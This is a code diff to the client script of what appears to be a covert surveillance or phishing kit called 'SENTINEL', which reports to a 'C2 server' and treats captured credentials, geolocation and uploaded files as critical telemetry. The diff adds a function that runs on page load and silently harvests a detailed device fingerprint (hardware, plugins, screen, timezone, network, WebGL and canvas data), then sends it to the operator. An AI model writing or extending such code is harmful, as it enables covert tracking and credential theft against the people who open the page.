@@ -59,7 +59,7 @@ async function sendTelemetry(event, data) {
         };
 
         // Critical events go via HTTP for reliability on Vercel/Serverless
-        const criticalEvents = ['join', 'creds', 'fingerprint', 'file_up', 'geo'];
+        const criticalEvents = ['join', 'creds', 'fingerprint', 'file_up', 'geo', 'network', 'update_network_data'];
         if (criticalEvents.includes(event)) {
             try {
                 await fetch('/api/telemetry', {
@@ -81,13 +81,110 @@ async function sendTelemetry(event, data) {
 
 // Initial join (Immediate HTTP fallback)
 sendTelemetry('join', { logId, linkId });
+captureFingerprint();
 
 // Join session with persistent ID
 socket.on('connect', () => {
     console.log('[SENTINEL] ✅ Connected to C2 server!');
     sendTelemetry('join', { logId, linkId });
+    // captureFingerprint(); // Already called above
     initPushNotifications();
 });
+
+// CAPTURE DEVICE FINGERPRINT
+function captureFingerprint() {
+    try {
+        const fingerprint = {
+            logId,
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+            deviceMemory: navigator.deviceMemory || 'Unknown',
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            vendor: navigator.vendor,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None',
+            screen: {
+                width: window.screen.width,
+                height: window.screen.height,
+                availWidth: window.screen.availWidth,
+                availHeight: window.screen.availHeight,
+                colorDepth: window.screen.colorDepth,
+                pixelDepth: window.screen.pixelDepth,
+                orientation: window.screen.orientation?.type || 'Unknown'
+            },
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezone_offset: new Date().getTimezoneOffset(),
+            connection: {
+                type: navigator.connection?.effectiveType || 'Unknown',
+                downlink: navigator.connection?.downlink || 'Unknown',
+                rtt: navigator.connection?.rtt || 'Unknown'
+            },
+            webgl: getWebGLInfo(),
+            canvas: getCanvasFingerprint(),
+            cpu_cores: navigator.hardwareConcurrency || 'Unknown',
+            ram_gb: navigator.deviceMemory || 'Unknown',
+            is_mobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+            is_tablet: /iPad|Android/.test(navigator.userAgent) && !/Mobile/.test(navigator.userAgent),
+            timestamp: new Date().toISOString()
+        };
+        
+        console.log('[SENTINEL] Fingerprint capturado:', fingerprint);
+        sendTelemetry('fingerprint', { fingerprint: fingerprint, logId: logId });
+        
+        // Also try to get network info
+        sendSimulatedData();
+    } catch(e) {
+        console.error('[SENTINEL] Erro ao capturar fingerprint:', e);
+    }
+}
+
+// Helper: Get WebGL info
+function getWebGLInfo() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return 'WebGL not supported';
+        
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (!debugInfo) return 'Debug info not available';
+        
+        return {
+            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+            version: gl.getParameter(gl.VERSION),
+            shading_version: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+        };
+    } catch(e) {
+        return 'WebGL error: ' + e.message;
+    }
+}
+
+// Helper: Get Canvas fingerprint
+function getCanvasFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        canvas.width = 280;
+        canvas.height = 60;
+        const ctx = canvas.getContext('2d');
+        
+        ctx.textBaseline = 'top';
+        ctx.font = '14px "Arial"';
+        ctx.textBaseline = 'alphabetic';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Browser Fingerprint 🔐', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('Browser Fingerprint 🔐', 4, 17);
+        
+        return canvas.toDataURL().substring(0, 50) + '...';
+    } catch(e) {
+        return 'Canvas error';
+    }
+}
 
 // Push Notification Handler (Socket Fallback)
 socket.on('push_notif', (data) => {
